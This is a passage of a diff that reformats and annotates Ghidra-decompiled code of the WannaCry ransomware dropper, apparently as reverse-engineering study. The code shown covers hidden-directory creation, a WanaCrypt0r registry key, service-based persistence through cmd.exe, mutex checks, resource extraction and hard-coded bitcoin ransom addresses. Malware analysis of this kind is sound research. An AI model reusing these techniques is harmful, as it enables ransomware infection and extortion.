@@ -340,8 +340,6 @@ typedef struct _s_CatchableTypeArray CatchableTypeArray;
 typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;
 
 typedef struct _s_CatchableType CatchableType;
-
-
 // WARNING! conflicting data type names: /ehdata.h/TypeDescriptor - /TypeDescriptor
 
 typedef struct PMD PMD, *PPMD;
@@ -752,12 +750,7 @@ struct StringInfo {
 
 typedef LONG LSTATUS;
 
-
-
-
-uint __cdecl FUN_00401000(void *param_1,int param_2)
-
-{
+uint __cdecl FUN_00401000(void *param_1,int param_2) {
   FILE *_File;
   uint uVar1;
   size_t sVar2;
@@ -786,11 +779,7 @@ uint __cdecl FUN_00401000(void *param_1,int param_2)
   return uVar1;
 }
 
-
-
-undefined4 __cdecl run_command(LPSTR param_1,DWORD param_2,LPDWORD param_3)
-
-{
+undefined4 __cdecl run_command(LPSTR param_1,DWORD param_2,LPDWORD param_3) {
   BOOL BVar1;
   DWORD DVar2;
   int iVar3;
@@ -836,11 +825,7 @@ undefined4 __cdecl run_command(LPSTR param_1,DWORD param_2,LPDWORD param_3)
   return uVar5;
 }
 
-
-
-undefined4 __cdecl set_or_query_registry_cwd(int set_registry)
-
-{
+undefined4 __cdecl set_or_query_registry_cwd(int set_registry) {
   size_t current_dir_length;
   LSTATUS LVar1;
   int iVar2;
@@ -848,84 +833,97 @@ undefined4 __cdecl set_or_query_registry_cwd(int set_registry)
   undefined4 *puVar3;
   bool bVar4;
   HKEY hKey;
-  BYTE local_2e0;
+  BYTE registry_value;
   undefined4 local_2df;
-  undefined4 local_d8 [5];
+  undefined4 software_str_buf [5];
   undefined4 local_c4 [45];
-  DWORD registry_value;
+  DWORD local_10;
   int i;
   HKEY regWanaHandle;
   
   iVar2 = 5;
   software_str = (undefined4 *)u_Software__0040e04c;
-  puVar3 = local_d8;
+  puVar3 = software_str_buf;
+  
   while (iVar2 != 0) {
     iVar2 = iVar2 + -1;
     *puVar3 = *software_str;
     software_str = software_str + 1;
     puVar3 = puVar3 + 1;
   }
-  local_2e0 = '\0';
+  
+  registry_value = '\0';
   iVar2 = 0x2d;
   regWanaHandle = (HKEY)0x0;
   software_str = local_c4;
+  
   while (iVar2 != 0) {
     iVar2 = iVar2 + -1;
     *software_str = 0;
     software_str = software_str + 1;
   }
+  
   iVar2 = 0x81;
   software_str = &local_2df;
+  
   while (iVar2 != 0) {
     iVar2 = iVar2 + -1;
     *software_str = 0;
     software_str = software_str + 1;
   }
+  
   *(undefined2 *)software_str = 0;
   *(undefined *)((int)software_str + 2) = 0;
-  wcscat((wchar_t *)local_d8,u_WanaCrypt0r_0040e034);
+  
+  // Software\WanaCrypt0r
+  wcscat((wchar_t *)software_str_buf,u_WanaCrypt0r_0040e034);
+  
   i = 0;
+  
   do {
     if (i == 0) {
+      // HKEY_LOCAL_MACHINE
       hKey = (HKEY)0x80000002;
-    }
-    else {
+    } else {
+      // HKEY_CURRENT_USER
       hKey = (HKEY)0x80000001;
     }
-    RegCreateKeyW(hKey,(LPCWSTR)local_d8,(PHKEY)&regWanaHandle);
+  
+    RegCreateKeyW(hKey,(LPCWSTR)software_str_buf,(PHKEY)&regWanaHandle);
+  
     if (regWanaHandle != (HKEY)0x0) {
       if (set_registry == 0) {
-        registry_value = 0x207;
-        LVar1 = RegQueryValueExA(regWanaHandle,s_wd_0040e030,(LPDWORD)0x0,(LPDWORD)0x0,&local_2e0,
-                                 &registry_value);
+        local_10 = 0x207;
+        LVar1 = RegQueryValueExA(regWanaHandle,s_wd_0040e030,(LPDWORD)0x0,(LPDWORD)0x0,&registry_value,
+                                 &local_10);
         bVar4 = LVar1 == 0;
+  
         if (bVar4) {
-          SetCurrentDirectoryA((LPCSTR)&local_2e0);
+          SetCurrentDirectoryA((LPCSTR)&registry_value);
         }
-      }
-      else {
-        GetCurrentDirectoryA(0x207,(LPSTR)&local_2e0);
-        current_dir_length = strlen((char *)&local_2e0);
-        LVar1 = RegSetValueExA(regWanaHandle,s_wd_0040e030,0,1,&local_2e0,current_dir_length + 1);
+      } else {
+        GetCurrentDirectoryA(0x207,(LPSTR)&registry_value);
+        current_dir_length = strlen((char *)&registry_value);
+        LVar1 = RegSetValueExA(regWanaHandle,s_wd_0040e030,0,1,&registry_value,current_dir_length + 1);
         bVar4 = LVar1 == 0;
       }
+  
       RegCloseKey(regWanaHandle);
+  
       if (bVar4) {
         return 1;
       }
     }
+  
     i = i + 1;
+  
     if (1 < i) {
       return 0;
     }
   } while( true );
 }
 
-
-
-void __cdecl randomstring_generator(char *randomstring_output)
-
-{
+void __cdecl randomstring_generator(char *randomstring_output) {
   size_t computername_len;
   int random_number2;
   int random_number;
@@ -943,11 +941,14 @@ void __cdecl randomstring_generator(char *randomstring_output)
   random_number = 99;
   computername_size = 399;
   puVar2 = local_19a;
+
+  //memset
   while (random_number != 0) {
     random_number = random_number + -1;
     *puVar2 = 0;
     puVar2 = puVar2 + 1;
   }
+
   *(undefined2 *)puVar2 = 0;
   GetComputerNameW((LPWSTR)&computername,&computername_size);
   local_8 = 0;
@@ -962,10 +963,12 @@ void __cdecl randomstring_generator(char *randomstring_output)
       computername_len = wcslen((wchar_t *)&computername);
     } while (local_8 < computername_len);
   }
+
   srand(_Seed);
   random_number = rand();
   iVar3 = 0;
   iVar1 = random_number % 8 + 8;
+  
   if (0 < iVar1) {
     do {
       random_number2 = rand();
@@ -973,20 +976,18 @@ void __cdecl randomstring_generator(char *randomstring_output)
       iVar3 = iVar3 + 1;
     } while (iVar3 < iVar1);
   }
+  
   while (iVar3 < random_number % 8 + 0xb) {
     iVar1 = rand();
     randomstring_output[iVar3] = (char)(iVar1 % 10) + '0';
     iVar3 = iVar3 + 1;
   }
+  
   randomstring_output[iVar3] = '\0';
   return;
 }
 
-
-
-undefined4 * FUN_004012fd(void)
-
-{
+undefined4 * FUN_004012fd(void) {
   undefined4 uVar1;
   undefined4 *extraout_ECX;
   int unaff_EBP;
@@ -1009,11 +1010,7 @@ undefined4 * FUN_004012fd(void)
   return extraout_ECX;
 }
 
-
-
-void * __thiscall FUN_0040135e(void *this,byte param_1)
-
-{
+void * __thiscall FUN_0040135e(void *this,byte param_1) {
   FUN_0040137a();
   if ((param_1 & 1) != 0) {
     operator_delete(this);
@@ -1021,11 +1018,7 @@ void * __thiscall FUN_0040135e(void *this,byte param_1)
   return this;
 }
 
-
-
-void FUN_0040137a(void)
-
-{
+void FUN_0040137a(void) {
   undefined4 *extraout_ECX;
   int unaff_EBP;
   undefined4 *in_FS_OFFSET;
@@ -1045,11 +1038,7 @@ void FUN_0040137a(void)
   return;
 }
 
-
-
-undefined4 __fastcall FUN_004013ce(int param_1)
-
-{
+undefined4 __fastcall FUN_004013ce(int param_1) {
   undefined *puVar1;
   int iVar2;
   int iVar3;
@@ -1081,11 +1070,7 @@ undefined4 __fastcall FUN_004013ce(int param_1)
   return 1;
 }
 
-
-
-undefined4 __thiscall FUN_00401437(void *this,LPCSTR param_1,undefined4 param_2,undefined4 param_3)
-
-{
+undefined4 __thiscall FUN_00401437(void *this,LPCSTR param_1,undefined4 param_2,undefined4 param_3) {
   int iVar1;
   HGLOBAL pvVar2;
   
@@ -1109,13 +1094,9 @@ undefined4 __thiscall FUN_00401437(void *this,LPCSTR param_1,undefined4 param_2,
   return 0;
 }
 
-
-
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-byte * __thiscall FUN_004014a6(void *this,LPCSTR param_1,uint *param_2)
-
-{
+byte * __thiscall FUN_004014a6(void *this,LPCSTR param_1,uint *param_2) {
   byte *pbVar1;
   HANDLE hFile;
   int iVar2;
@@ -1204,13 +1185,9 @@ byte * __thiscall FUN_004014a6(void *this,LPCSTR param_1,uint *param_2)
   return pbVar3;
 }
 
-
-
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-undefined4 FUN_0040170a(void)
-
-{
+undefined4 FUN_0040170a(void) {
   int iVar1;
   HMODULE hModule;
   
@@ -1239,11 +1216,7 @@ undefined4 FUN_0040170a(void)
   return 0;
 }
 
-
-
-undefined4 * __fastcall FUN_004017dd(undefined4 *param_1)
-
-{
+undefined4 * __fastcall FUN_004017dd(undefined4 *param_1) {
   param_1[1] = 0;
   param_1[2] = 0;
   param_1[3] = 0;
@@ -1252,11 +1225,7 @@ undefined4 * __fastcall FUN_004017dd(undefined4 *param_1)
   return param_1;
 }
 
-
-
-undefined4 * __thiscall FUN_004017ff(void *this,byte param_1)
-
-{
+undefined4 * __thiscall FUN_004017ff(void *this,byte param_1) {
   FUN_0040181b((undefined4 *)this);
   if ((param_1 & 1) != 0) {
     operator_delete(this);
@@ -1264,23 +1233,15 @@ undefined4 * __thiscall FUN_004017ff(void *this,byte param_1)
   return (undefined4 *)this;
 }
 
-
-
-void __fastcall FUN_0040181b(undefined4 *param_1)
-
-{
+void __fastcall FUN_0040181b(undefined4 *param_1) {
   *param_1 = 0x4081ec;
   DeleteCriticalSection((LPCRITICAL_SECTION)(param_1 + 4));
   return;
 }
 
-
-
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-undefined4 __fastcall FUN_0040182c(int param_1)
-
-{
+undefined4 __fastcall FUN_0040182c(int param_1) {
   int iVar1;
   int iVar2;
   
@@ -1295,13 +1256,9 @@ undefined4 __fastcall FUN_0040182c(int param_1)
   return 0;
 }
 
-
-
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-undefined4 __thiscall FUN_00401861(void *this,LPCSTR param_1)
-
-{
+undefined4 __thiscall FUN_00401861(void *this,LPCSTR param_1) {
   int iVar1;
   
   iVar1 = FUN_0040182c((int)this);
@@ -1321,13 +1278,9 @@ undefined4 __thiscall FUN_00401861(void *this,LPCSTR param_1)
   return 0;
 }
 
-
-
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-undefined4 __fastcall FUN_004018b9(int param_1)
-
-{
+undefined4 __fastcall FUN_004018b9(int param_1) {
   if (*(int *)(param_1 + 8) != 0) {
     (*_DAT_0040f89c)(*(int *)(param_1 + 8));
     *(undefined4 *)(param_1 + 8) = 0;
@@ -1343,13 +1296,9 @@ undefined4 __fastcall FUN_004018b9(int param_1)
   return 1;
 }
 
-
-
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-undefined4 __cdecl FUN_004018f9(undefined4 param_1,undefined4 param_2,LPCSTR param_3)
-
-{
+undefined4 __cdecl FUN_004018f9(undefined4 param_1,undefined4 param_2,LPCSTR param_3) {
   HANDLE hFile;
   DWORD dwBytes;
   HGLOBAL lpBuffer;
@@ -1391,14 +1340,9 @@ undefined4 __cdecl FUN_004018f9(undefined4 param_1,undefined4 param_2,LPCSTR par
   return uVar3;
 }
 
-
-
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-undefined4 __thiscall
-FUN_004019e1(void *this,void *param_1,size_t param_2,void *param_3,size_t *param_4)
-
-{
+undefined4 __thiscall FUN_004019e1(void *this,void *param_1,size_t param_2,void *param_3,size_t *param_4) {
   LPCRITICAL_SECTION lpCriticalSection;
   int iVar1;
   
@@ -1417,13 +1361,9 @@ FUN_004019e1(void *this,void *param_1,size_t param_2,void *param_3,size_t *param
   return 0;
 }
 
-
-
 // WARNING: Globals starting with '_' overlap smaller symbols at the same address
 
-undefined4 FUN_00401a45(void)
-
-{
+undefined4 FUN_00401a45(void) {
   HMODULE hModule;
   undefined4 uVar1;
   
@@ -1450,11 +1390,7 @@ LAB_00401aec:
   return uVar1;
 }
 
-
-
-undefined4 __cdecl create_and_cwd_dir(LPCWSTR dir_1,LPCWSTR dir_2,wchar_t *dir_out)
-
-{
+int create_and_cwd_dir(LPCWSTR dir_1,LPCWSTR dir_2,wchar_t *dir_out) {
   BOOL BVar1;
   DWORD DVar2;
   
@@ -1462,6 +1398,8 @@ undefined4 __cdecl create_and_cwd_dir(LPCWSTR dir_1,LPCWSTR dir_2,wchar_t *dir_o
   BVar1 = SetCurrentDirectoryW(dir_1);
   if (BVar1 != 0) {
     CreateDirectoryW(dir_2,(LPSECURITY_ATTRIBUTES)0x0);
+
+    // Set file/folder to hidden & system
     BVar1 = SetCurrentDirectoryW(dir_2);
     if (BVar1 != 0) {
       DVar2 = GetFileAttributesW(dir_2);
@@ -1475,16 +1413,11 @@ undefined4 __cdecl create_and_cwd_dir(LPCWSTR dir_1,LPCWSTR dir_2,wchar_t *dir_o
   return 0;
 }
 
-
-
-uint __cdecl create_and_cwd_random_hidden_directory(wchar_t *cwd_out)
-
-{
+uint create_and_cwd_random_hidden_directory(wchar_t *cwd_out) {
   DWORD pd_attr;
   wchar_t *pwVar1;
   int iVar2;
   undefined4 *puVar3;
-  undefined2 local_4d8;
   WCHAR programdata_path;
   undefined4 local_2d2 [129];
   WCHAR randomstring_w;
@@ -1492,60 +1425,74 @@ uint __cdecl create_and_cwd_random_hidden_directory(wchar_t *cwd_out)
   
   iVar2 = 0x81;
   puVar3 = (undefined4 *)&stack0xfffffb26;
+  
   while (iVar2 != 0) {
     iVar2 = iVar2 + -1;
     *puVar3 = 0;
     puVar3 = puVar3 + 1;
   }
+  
   *(undefined2 *)puVar3 = 0;
   iVar2 = 0x81;
   programdata_path = DAT_0040f874;
   puVar3 = local_2d2;
+  
   while (iVar2 != 0) {
     iVar2 = iVar2 + -1;
     *puVar3 = 0;
     puVar3 = puVar3 + 1;
   }
+  
   *(undefined2 *)puVar3 = 0;
   iVar2 = 0x31;
   randomstring_w = DAT_0040f874;
   puVar3 = local_ca;
+  
   while (iVar2 != 0) {
     iVar2 = iVar2 + -1;
     *puVar3 = 0;
     puVar3 = puVar3 + 1;
   }
+
   *(undefined2 *)puVar3 = 0;
   MultiByteToWideChar(0,0,(LPCSTR)&randomstring,-1,&randomstring_w,99);
+  
+  // gets C:\ or C:\Windows
   GetWindowsDirectoryW((LPWSTR)&stack0xfffffb24,0x104);
-  local_4d8 = 0;
+
+  // C:\ProgramData or C:\Windows\ProgramData
+
   swprintf(&programdata_path,u__s_ProgramData_0040f40c,&stack0xfffffb24);
   pd_attr = GetFileAttributesW(&programdata_path);
+  
   if ((pd_attr == 0xffffffff) ||
      (iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out), iVar2 == 0)) {
+    
+    // C:\Intel or C:\Windows\Intel
     swprintf(&programdata_path,u__s_Intel_0040f3f8,(wchar_t *)&stack0xfffffb24);
     iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out);
+    
     if ((iVar2 == 0) &&
-       (iVar2 = create_and_cwd_dir((LPCWSTR)&stack0xfffffb24,&randomstring_w,cwd_out), iVar2 == 0))
+       (iVar2 = create_and_cwd_dir((LPCWSTR)&stack0xfffffb24,&randomstring_w,cwd_out), iVar2 == 0 /*C:\*randomstring* */))
     {
       GetTempPathW(0x104,&programdata_path);
       pwVar1 = wcsrchr(&programdata_path,L'\\');
+    
       if (pwVar1 != (wchar_t *)0x0) {
         pwVar1 = wcsrchr(&programdata_path,L'\\');
         *pwVar1 = L'\0';
       }
+    
       iVar2 = create_and_cwd_dir(&programdata_path,&randomstring_w,cwd_out);
+    
       return (uint)(iVar2 != 0);
     }
   }
+  
   return 1;
 }
 
-
-
-undefined4 __cdecl create_taskche_service(char *path_to_taskche)
-
-{
+undefined4 __cdecl create_taskche_service(char *path_to_taskche) {
   undefined4 uVar1;
   SC_HANDLE hService;
   CHAR local_410 [1024];
@@ -1555,39 +1502,39 @@ undefined4 __cdecl create_taskche_service(char *path_to_taskche)
   
   local_c = 0;
   scmanager = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
+  
   if (scmanager == (SC_HANDLE)0x0) {
     uVar1 = 0;
-  }
-  else {
+  } else {
     randomstring_service = OpenServiceA(scmanager,(LPCSTR)&randomstring,0xf01ff);
+    
     if (randomstring_service == (SC_HANDLE)0x0) {
       sprintf(local_410,s_cmd_exe__c___s__0040f42c,path_to_taskche);
       hService = CreateServiceA(scmanager,(LPCSTR)&randomstring,(LPCSTR)&randomstring,0xf01ff,0x10,2
                                 ,1,local_410,(LPCSTR)0x0,(LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,
                                 (LPCSTR)0x0);
       uVar1 = local_c;
+      
       if (hService != (SC_HANDLE)0x0) {
         StartServiceA(hService,0,(LPCSTR *)0x0);
         CloseServiceHandle(hService);
         local_c = 1;
         uVar1 = local_c;
       }
-    }
-    else {
+
+    } else {
       StartServiceA(randomstring_service,0,(LPCSTR *)0x0);
       CloseServiceHandle(randomstring_service);
       uVar1 = 1;
     }
+
     CloseServiceHandle(scmanager);
   }
+
   return uVar1;
 }
 
-
-
-undefined4 __cdecl FUN_00401dab(HMODULE param_1,char *param_2)
-
-{
+undefined4 __cdecl FUN_00401dab(HMODULE param_1,char *param_2) {
   HRSRC hResInfo;
   HGLOBAL hResData;
   LPVOID pvVar1;
@@ -1600,7 +1547,7 @@ undefined4 __cdecl FUN_00401dab(HMODULE param_1,char *param_2)
   int local_130;
   undefined4 local_12c [74];
   
-  hResInfo = FindResourceA(param_1,(LPCSTR)0x80a,&DAT_0040f43c);
+  hResInfo = FindResourceA(param_1,(LPCSTR)2058,&DAT_0040f43c);
   if (((hResInfo != (HRSRC)0x0) &&
       (hResData = LoadResource(param_1,hResInfo), hResData != (HGLOBAL)0x0)) &&
      (pvVar1 = LockResource(hResData), pvVar1 != (LPVOID)0x0)) {
@@ -1610,37 +1557,39 @@ undefined4 __cdecl FUN_00401dab(HMODULE param_1,char *param_2)
       local_130 = 0;
       iVar5 = 0x4a;
       puVar6 = local_12c;
+
       while (iVar5 != 0) {
         iVar5 = iVar5 + -1;
         *puVar6 = 0;
         puVar6 = puVar6 + 1;
       }
+      
       FUN_004075c4(piVar3,(char *)0xffffffff,&local_130);
+      
       iVar5 = local_130;
       pcVar7 = (char *)0x0;
+      
       if (0 < local_130) {
         do {
           FUN_004075c4(piVar3,pcVar7,&local_130);
           iVar4 = strcmp((char *)local_12c,s_c_wnry_0040e010);
-          if ((iVar4 != 0) || (DVar2 = GetFileAttributesA((LPCSTR)local_12c), DVar2 == 0xffffffff))
-          {
+          if ((iVar4 != 0) || (DVar2 = GetFileAttributesA((LPCSTR)local_12c), DVar2 == 0xffffffff)) {
             FUN_0040763d(piVar3,pcVar7,(char *)local_12c);
           }
+
           pcVar7 = pcVar7 + 1;
         } while ((int)pcVar7 < iVar5);
       }
+      
       FUN_00407656(piVar3);
       return 1;
     }
   }
+
   return 0;
 }
 
-
-
-void bitcoin_something(void)
-
-{
+void bitcoin_something(void) {
   uint uVar1;
   int iVar2;
   undefined local_31c [178];
@@ -1651,25 +1600,25 @@ void bitcoin_something(void)
   local_10[1] = s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464;
   local_10[2] = s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440;
   uVar1 = FUN_00401000(local_31c,1);
+
   if (uVar1 != 0) {
     iVar2 = rand();
     strcpy(local_26a,local_10[iVar2 % 3]);
     FUN_00401000(local_31c,0);
   }
+
   return;
 }
 
-
-
-undefined4 __cdecl acquire_taskche_mutex(int number_of_tries)
-
-{
+undefined4 __cdecl acquire_taskche_mutex(int number_of_tries) {
   HANDLE hObject;
   int iVar1;
   CHAR local_68 [100];
   
   sprintf(local_68,s__s_d_0040f4ac,s_Global_MsWinZonesCacheCounterMut_0040f4b4,0);
   iVar1 = 0;
+  
+  // if mutex acquisition is successful return 1 
   if (0 < number_of_tries) {
     do {
       hObject = OpenMutexA(0x100000,1,local_68);
@@ -1677,18 +1626,18 @@ undefined4 __cdecl acquire_taskche_mutex(int number_of_tries)
         CloseHandle(hObject);
         return 1;
       }
+
+      // sleep and try again
       Sleep(1000);
       iVar1 = iVar1 + 1;
     } while (iVar1 < number_of_tries);
   }
+
+  // if mutex couldn't be acquired return 0
   return 0;
 }
 
-
-
-undefined4 create_or_start_taskche_service(void)
-
-{
+undefined4 create_or_start_taskche_service(void) {
   int iVar1;
   undefined4 *puVar2;
   CHAR path_to_taskche;
@@ -1716,11 +1665,8 @@ undefined4 create_or_start_taskche_service(void)
   return 0;
 }
 
-
-
-int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdShow)
-
-{
+int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdShow) {
+  
   int *argc;
   char ***argv;
   uint uVar1;
@@ -1737,34 +1683,47 @@ int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdS
   filename[0] = DAT_0040f910;
   arg1_cmp = 0x81;
   puVar5 = (undefined4 *)(filename + 1);
+  
+  //memset
   while (arg1_cmp != 0) {
     arg1_cmp = arg1_cmp + -1;
     *puVar5 = 0;
     puVar5 = puVar5 + 1;
   }
+
   *(undefined2 *)puVar5 = 0;
   *(undefined *)((int)puVar5 + 2) = 0;
   GetModuleFileNameA((HMODULE)0x0,filename,520);
   randomstring_generator((char *)&randomstring);
+
   argc = (int *)__p___argc();
+  
   if (*argc == 2) {
     _s__i = s__i_0040f538;
     argv = (char ***)__p___argv();
+    
+    // strcmp(argv[i], "/i");
+
     arg1_cmp = strcmp((*argv)[1],_s__i);
+
     if ((arg1_cmp == 0) &&
        (uVar1 = create_and_cwd_random_hidden_directory((wchar_t *)0x0), uVar1 != 0)) {
       CopyFileA(filename,s_tasksche_exe_0040f4d8,0);
       DVar2 = GetFileAttributesA(s_tasksche_exe_0040f4d8);
+      
       if ((DVar2 != 0xffffffff) && (arg1_cmp = create_or_start_taskche_service(), arg1_cmp != 0)) {
         return 0;
       }
     }
   }
+  
   _s__i = strrchr(filename,0x5c);
+  
   if (_s__i != (char *)0x0) {
     _s__i = strrchr(filename,0x5c);
     *_s__i = '\0';
   }
+  
   SetCurrentDirectoryA(filename);
   set_or_query_registry_cwd(1);
   FUN_00401dab((HMODULE)0x0,s_WNcry_2ol7_0040f52c);
@@ -1789,23 +1748,15 @@ int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,PWSTR pCmdLine,int nCmdS
   return 0;
 }
 
-
-
-void __cdecl FUN_004021bd(short *param_1,uint param_2)
-
-{
+void __cdecl FUN_004021bd(short *param_1,uint param_2) {
   FUN_004021e9(param_1,param_2,&LAB_0040216e,&LAB_00402185,(uint)&LAB_00402198,&LAB_004021a3,
                (uint)&LAB_004021b2,0);
   return;
 }
 
-
-
 uint * __cdecl
 FUN_004021e9(short *param_1,uint param_2,undefined *param_3,undefined *param_4,uint param_5,
-            undefined *param_6,uint param_7,uint param_8)
-
-{
+            undefined *param_6,uint param_7,uint param_8) {
   int iVar1;
   HMODULE pHVar2;
   code *pcVar3;
@@ -1930,11 +1881,7 @@ LAB_00402219:
   return (uint *)0x0;
 }
 
-
-
-undefined4 __cdecl FUN_00402457(uint param_1,uint param_2)
-
-{
+undefined4 __cdecl FUN_00402457(uint param_1,uint param_2) {
   if (param_1 < param_2) {
     SetLastError(0xd);
     return 0;
@@ -1942,11 +1889,7 @@ undefined4 __cdecl FUN_00402457(uint param_1,uint param_2)
   return 1;
 }
 
-
-
-undefined4 __cdecl FUN_00402470(int param_1,uint param_2,int param_3,int *param_4)
-
-{
+undefined4 __cdecl FUN_00402470(int param_1,uint param_2,int param_3,int *param_4) {
   int iVar1;
   size_t _Size;
   size_t *psVar2;
@@ -1990,11 +1933,7 @@ undefined4 __cdecl FUN_00402470(int param_1,uint param_2,int param_3,int *param_
   return 1;
 }
 
-
-
-uint __cdecl FUN_0040254b(int *param_1)
-
-{
+uint __cdecl FUN_0040254b(int *param_1) {
   int iVar1;
   int iVar2;
   int *piVar3;
@@ -2051,11 +1990,7 @@ uint __cdecl FUN_0040254b(int *param_1)
   return (uint)(uVar5 != 0);
 }
 
-
-
-int __cdecl FUN_0040264f(int *param_1,int param_2)
-
-{
+int __cdecl FUN_0040264f(int *param_1,int param_2) {
   int iVar1;
   
   iVar1 = *(int *)(param_2 + 0x10);
@@ -2070,11 +2005,7 @@ int __cdecl FUN_0040264f(int *param_1,int param_2)
   return iVar1;
 }
 
-
-
-uint __cdecl FUN_0040267b(int *param_1,LPVOID *param_2)
-
-{
+uint __cdecl FUN_0040267b(int *param_1,LPVOID *param_2) {
   LPVOID dwSize;
   LPVOID pvVar1;
   uint flNewProtect;
@@ -2108,11 +2039,7 @@ uint __cdecl FUN_0040267b(int *param_1,LPVOID *param_2)
   return flNewProtect;
 }
 
-
-
-undefined4 __cdecl FUN_0040271d(int *param_1)
-
-{
+undefined4 __cdecl FUN_0040271d(int *param_1) {
   int iVar1;
   code **ppcVar2;
   
@@ -2130,11 +2057,7 @@ undefined4 __cdecl FUN_0040271d(int *param_1)
   return 1;
 }
 
-
-
-uint __cdecl FUN_00402758(int *param_1,int param_2)
-
-{
+uint __cdecl FUN_00402758(int *param_1,int param_2) {
   int iVar1;
   int iVar2;
   int *piVar3;
@@ -2170,11 +2093,7 @@ uint __cdecl FUN_00402758(int *param_1,int param_2)
   return uVar4;
 }
 
-
-
-int __cdecl FUN_004027df(uint *param_1)
-
-{
+int __cdecl FUN_004027df(uint *param_1) {
   uint uVar1;
   uint *puVar2;
   void *pvVar3;
@@ -2254,11 +2173,7 @@ LAB_004028fd:
   return iVar5;
 }
 
-
-
-int __cdecl FUN_00402924(int *param_1,char *param_2)
-
-{
+int __cdecl FUN_00402924(int *param_1,char *param_2) {
   int iVar1;
   uint uVar2;
   int iVar3;
@@ -2304,11 +2219,7 @@ LAB_004029ba:
   return 0;
 }
 
-
-
-void __cdecl FUN_004029cc(int *param_1)
-
-{
+void __cdecl FUN_004029cc(int *param_1) {
   int iVar1;
   HANDLE hHeap;
   int iVar2;
@@ -2341,21 +2252,13 @@ void __cdecl FUN_004029cc(int *param_1)
   return;
 }
 
-
-
-void __fastcall FUN_00402a46(undefined4 *param_1)
-
-{
+void __fastcall FUN_00402a46(undefined4 *param_1) {
   *(undefined *)(param_1 + 1) = 0;
   *param_1 = 0x40bc7c;
   return;
 }
 
-
-
-undefined4 * __thiscall FUN_00402a53(void *this,byte param_1)
-
-{
+undefined4 * __thiscall FUN_00402a53(void *this,byte param_1) {
   FUN_00402a6f((undefined4 *)this);
   if ((param_1 & 1) != 0) {
     operator_delete(this);
@@ -2363,20 +2266,12 @@ undefined4 * __thiscall FUN_00402a53(void *this,byte param_1)
   return (undefined4 *)this;
 }
 
-
-
-void __fastcall FUN_00402a6f(undefined4 *param_1)
-
-{
+void __fastcall FUN_00402a6f(undefined4 *param_1) {
   *param_1 = 0x40bc7c;
   return;
 }
 
-
-
-void __thiscall FUN_00402a76(void *this,byte *param_1,uint *param_2,int param_3,byte *param_4)
-
-{
+void __thiscall FUN_00402a76(void *this,byte *param_1,uint *param_2,int param_3,byte *param_4) {
   undefined4 uVar1;
   uint uVar2;
   int iVar3;
@@ -2580,13 +2475,9 @@ LAB_00402e04:
   return;
 }
 
-
-
 // WARNING: Could not reconcile some variable overlaps
 
-void __thiscall FUN_00402e7e(void *this,uint *param_1,byte *param_2)
-
-{
+void __thiscall FUN_00402e7e(void *this,uint *param_1,byte *param_2) {
   int iVar1;
   undefined4 uVar2;
   uint uVar3;
@@ -2675,13 +2566,9 @@ void __thiscall FUN_00402e7e(void *this,uint *param_1,byte *param_2)
   _CxxThrowException(local_2c,(ThrowInfo *)&pThrowInfo_0040d570);
 }
 
-
-
 // WARNING: Could not reconcile some variable overlaps
 
-void __thiscall FUN_004031bc(void *this,byte *param_1,byte *param_2)
-
-{
+void __thiscall FUN_004031bc(void *this,byte *param_1,byte *param_2) {
   int iVar1;
   undefined4 uVar2;
   uint uVar3;
@@ -2766,11 +2653,7 @@ void __thiscall FUN_004031bc(void *this,byte *param_1,byte *param_2)
   _CxxThrowException(local_30,(ThrowInfo *)&pThrowInfo_0040d570);
 }
 
-
-
-void __thiscall FUN_0040350f(void *this,uint *param_1,byte *param_2)
-
-{
+void __thiscall FUN_0040350f(void *this,uint *param_1,byte *param_2) {
   undefined4 uVar1;
   uint *puVar2;
   int iVar3;
@@ -2883,11 +2766,7 @@ void __thiscall FUN_0040350f(void *this,uint *param_1,byte *param_2)
   return;
 }
 
-
-
-void __thiscall FUN_00403797(void *this,byte *param_1,byte *param_2)
-
-{
+void __thiscall FUN_00403797(void *this,byte *param_1,byte *param_2) {
   undefined4 uVar1;
   uint *puVar2;
   int iVar3;
@@ -3000,11 +2879,7 @@ void __thiscall FUN_00403797(void *this,byte *param_1,byte *param_2)
   return;
 }
 
-
-
-void __thiscall FUN_00403a28(void *this,byte *param_1,byte *param_2)
-
-{
+void __thiscall FUN_00403a28(void *this,byte *param_1,byte *param_2) {
   int iVar1;
   exception local_10 [12];
   
@@ -3025,11 +2900,7 @@ void __thiscall FUN_00403a28(void *this,byte *param_1,byte *param_2)
   _CxxThrowException(local_10,(ThrowInfo *)&pThrowInfo_0040d570);
 }
 
-
-
-void __thiscall FUN_00403a77(void *this,byte *param_1,byte *param_2,uint param_3,uint param_4)
-
-{
+void __thiscall FUN_00403a77(void *this,byte *param_1,byte *param_2,uint param_3,uint param_4) {
   uint uVar1;
   bool bVar2;
   exception local_10 [12];
@@ -3093,11 +2964,7 @@ void __thiscall FUN_00403a77(void *this,byte *param_1,byte *param_2,uint param_3
   _CxxThrowException(local_10,(ThrowInfo *)&pThrowInfo_0040d570);
 }
 
-
-
-int __cdecl FUN_00403bd6(int param_1,void *param_2,int param_3)
-
-{
+int __cdecl FUN_00403bd6(int param_1,void *param_2,int param_3) {
   void *_Src;
   void *pvVar1;
   uint uVar2;
@@ -3167,12 +3034,8 @@ int __cdecl FUN_00403bd6(int param_1,void *param_2,int param_3)
   return param_3;
 }
 
-
-
 void __cdecl
